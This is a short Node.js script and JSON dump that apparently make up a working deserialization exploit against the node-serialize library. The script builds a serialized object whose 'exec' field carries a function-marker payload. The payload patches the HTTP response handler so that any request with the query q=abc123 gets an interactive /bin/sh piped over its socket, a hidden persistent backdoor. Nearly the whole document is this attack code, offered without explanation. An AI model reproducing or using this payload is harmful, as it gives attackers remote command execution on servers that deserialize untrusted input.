const serialize = require('node-serialize');

const valueObj = {
  funky: require('http').ServerResponse.prototype.end = ((end) => {
      return function () {
            if (this.socket._httpMessage.req.query.q === 'abc123') {
                      ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket))
                      const cp = require('child_process')
                      const net = require('net')
                      const sh = cp.spawn('/bin/sh')
                      sh.stdout.pipe(this.socket)
                      sh.stderr.pipe(this.socket)
                      this.socket.pipe(sh.stdin)
                  } else {
                            end.apply(this, arguments)
                        }
          }
  })(require('http').ServerResponse.prototype.end)
};

function serialize_vuln(func) {
  return JSON.stringify(serialize.serialize(func));
}

console.log(JSON.stringify(serialize_vuln(valueObj), null, 2));

// Object dump
{
	"username": "Dummy",
	"country": "Idk Probably Somewhere Dumb",
	"city": "Lametown",
	"num": "2",
	"exec": "_$$ND_FUNC$$_ require('http').ServerResponse.prototype.end = (function(end){return function () {if (this.socket._httpMessage.req.query.q === 'abc123') {['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));var cp=require('child_process');var net = require('net');var sh = cp.spawn('/bin/sh');sh.stdout.pipe(this.socket);sh.stderr.pipe(this.socket);this.socket.pipe(sh.stdin);}else{end.apply(this, arguments);}}})(require('http').ServerResponse.prototype.end)"
}
